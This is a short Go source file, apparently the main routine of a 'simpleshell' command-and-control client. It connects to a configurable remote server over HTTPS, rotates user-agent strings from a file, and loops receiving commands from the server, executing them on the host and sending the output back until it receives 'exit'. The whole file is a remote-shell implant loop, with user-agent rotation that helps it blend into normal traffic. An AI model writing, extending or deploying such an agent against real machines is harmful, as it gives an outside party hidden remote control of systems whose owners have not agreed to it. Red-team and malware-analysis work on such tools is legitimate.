package main

import (
	"flag"

	"github.com/gogetthis/simpleshell/utils"
)

func main() {

	serverPtr := flag.String("server", "localhost:8443", "enter the remote server address [HOST:PORT]")
	agentsListPtr := flag.String("useragents", "useragents.txt", "enter the useragents file")

	flag.Parse()

	server := utils.C2{
		Address:   *serverPtr,
		Protocol:  "https",
		UserAgent: "goclient",
	}

	for {
		server.RandomUser(*agentsListPtr)

		job := utils.Job{
			Command: server.ReceiveCommand(),
		}

		if job.Command == "exit" {
			return
		}

		if job.Execute() {
			server.SendOutput(job.Output)
		}
	}

}
